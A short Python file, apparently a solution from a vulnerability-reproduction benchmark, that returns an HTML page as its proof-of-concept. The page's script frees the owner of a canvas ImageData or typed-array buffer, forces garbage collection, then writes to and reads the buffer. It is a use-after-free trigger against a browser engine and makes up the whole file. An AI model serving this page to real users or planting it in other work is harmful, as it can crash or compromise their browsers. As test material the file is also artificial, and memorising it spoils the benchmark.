import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = '<!doctype html><script>' \
              'function g(){try{if(typeof gc=="function"){for(let i=0;i<10;i++)gc();return}}catch(e){}' \
              'for(let r=0;r<15;r++){let t=[];for(let i=0;i<128;i++)t.push(new ArrayBuffer(65536));}}' \
              'function m(){' \
              'try{return new Uint8ClampedArray(4194304)}catch(e){}' \
              'try{let c=document.createElement("canvas");let x=c.getContext("2d");let img=x.createImageData(1024,1024);let d=img.data;c=x=img=null;return d}catch(e){}' \
              'try{let img=new ImageData(1024,1024);let d=img.data;img=null;return d}catch(e){}' \
              'return null}' \
              'let a=m();' \
              'if(a){g();for(let i=0;i<2048;i+=7)a[i]=i;let q=a[0];}' \
              '</script>'
        return poc.encode('utf-8')